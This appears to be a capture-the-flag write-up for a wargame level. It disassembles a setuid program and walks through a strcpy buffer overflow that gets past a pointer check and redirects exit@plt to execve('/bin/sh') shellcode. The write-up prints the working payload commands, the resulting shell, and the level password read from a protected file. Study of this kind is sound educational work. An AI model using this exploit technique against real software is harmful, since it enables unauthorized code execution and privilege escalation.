Dump of assembler code for function main:
```assembly
   0x0804842d <+0>:     push   ebp
   0x0804842e <+1>:     mov    ebp,esp
   0x08048430 <+3>:     and    esp,0xfffffff0
   0x08048433 <+6>:     sub    esp,0xa0
   0x08048439 <+12>:    mov    DWORD PTR [esp+0x9c],0x8049748	#some sort of validation check (t.b.c)
   0x08048444 <+23>:    cmp    DWORD PTR [ebp+0x8],0x2		# if num of args == 2
   0x08048448 <+27>:    je     0x8048456 <main+41>
   0x0804844a <+29>:    mov    DWORD PTR [esp],0x1
   0x08048451 <+36>:    call   0x8048310 <exit@plt>
   0x08048456 <+41>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048459 <+44>:    add    eax,0x4
   0x0804845c <+47>:    mov    eax,DWORD PTR [eax]
   0x0804845e <+49>:    mov    DWORD PTR [esp+0x4],eax		#push env[0]
   0x08048462 <+53>:    lea    eax,[esp+0x18]
   0x08048466 <+57>:    mov    DWORD PTR [esp],eax		#push buffer
   0x08048469 <+60>:    call   0x80482f0 <strcpy@plt>
   0x0804846e <+65>:    mov    eax,DWORD PTR [esp+0x9c]		#said validation address
   0x08048475 <+72>:    mov    ax,0x0				#lower part is zeroed (don't care)
   0x08048479 <+76>:    cmp    eax,0x8040000			#validate its integrity, if not equal, exit
   0x0804847e <+81>:    je     0x804848c <main+95>
   0x08048480 <+83>:    mov    DWORD PTR [esp],0x2
   0x08048487 <+90>:    call   0x8048310 <exit@plt>
   0x0804848c <+95>:    mov    eax,DWORD PTR [esp+0x9c]	
   0x08048493 <+102>:   mov    eax,DWORD PTR [eax]	
   0x08048495 <+104>:   mov    DWORD PTR [esp+0x98],eax		#write some opcode at our "aaaa"s
   0x0804849c <+111>:   mov    eax,DWORD PTR [esp+0x9c]		#watch from here:		
   0x080484a3 <+118>:   mov    eax,DWORD PTR [eax]		#eax = our modified addr's value		
   0x080484a5 <+120>:   lea    edx,[esp+0x18]			#loads one of our buffer's addr		
   0x080484a9 <+124>:   mov    DWORD PTR [eax],edx		#writes edx to our modified addr's value
   0x080484ab <+126>:   mov    DWORD PTR [esp],0x0
   0x080484b2 <+133>:   call   0x8048310 <exit@plt>		#overwrite me
```

Dump of assembler code for function exit@plt:
```assembly
   0x08048310 <+0>:     jmp    *0x8049734
   0x08048316 <+6>:     push   $0x10
   0x0804831b <+11>:    jmp    0x80482e0
```
we need 152 bytes to override the return address, but we see the program makes a sort of validation  
check so we'll bypass it...  
the address we need to "fool" - 0xffffd52c: 0x08049748  
this time around its big indian...  
r $(python -c 'print "a"*132 + "\x00\x00\x04\x08"+"a"*16')
ok, we still exit normally, but we can temper with the 2 lower bytes of our modified addr...  
but first, we see that the program writes the memory address of our buffer...  
so we can only overwrite an absolute jmp instruction (all other opcodes use relative jmp, which we can't use...)  
after some digging, we find an absolute jmp address at exit@plt:  
so lets overwrite exit@plt() function by writing it's addr to our buffer:  
r $(python -c 'print "a"*132 + "\x10\x83\x04\x08"+"a"*16')  
it crashed... corection: we need to overwrite somewhere else:  
0x8048310 <exit@plt>:   0x973425ff      0x10680804 --> we missed by 2 bytes!  
r $(python -c 'print "a"*132 + "\x12\x83\x04\x08")  
indded we have overwritten the return address...  
we replace "a"'s with shellcode:  
r $(python -c 'print "\x90"*101 + "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc9\xb0\x0b\xcd\x80" + "aaaa" + "\x12\x83\x04\x08"')  

we get:  
$ whoami  
vortex4  
$ cat /etc/vortex_pass/vortex4  
2YmgK1=jw

summery: we had to find an address at 0x0804<xxxx> which points to an address that has direct jmp of the type: jmp *<address>,  
why? because the code write to the address of the address that we chose, so jmp with value of an address is needed...  
then we'll be able to get control over the code...fortunatly, exit@plt supplies us with just that.  


